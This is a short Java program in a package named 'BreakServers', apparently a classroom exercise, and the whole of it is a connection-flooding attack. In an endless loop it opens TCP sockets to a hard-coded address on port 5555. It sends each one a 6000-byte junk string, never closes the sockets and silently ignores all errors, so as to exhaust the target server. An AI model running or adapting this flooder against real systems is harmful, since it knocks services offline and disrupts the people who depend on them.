package UF3PSP.BreakServers;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * Created by 48089748z on 10/02/16.
 */
public class Runner
{
    private static String dionisIP = "172.31.83.197";
    private static String mensajeAEnviar="";
    public static void main(String[] args)
    {
        for (int x = 0; x<6000; x++) {mensajeAEnviar = mensajeAEnviar + "@";}
        while(true)
        {
            try
            {
                Socket clienteSocket = new Socket();
                InetSocketAddress address = new InetSocketAddress(dionisIP, 5555);
                clienteSocket.connect(address);

                OutputStream output = clienteSocket.getOutputStream();
                output.write(mensajeAEnviar.getBytes());
                //Fil fil = new Fil(clienteSocket, mensajeAEnviar);
                //fil.run();

            } catch (IOException e) {}
        }
    }
}

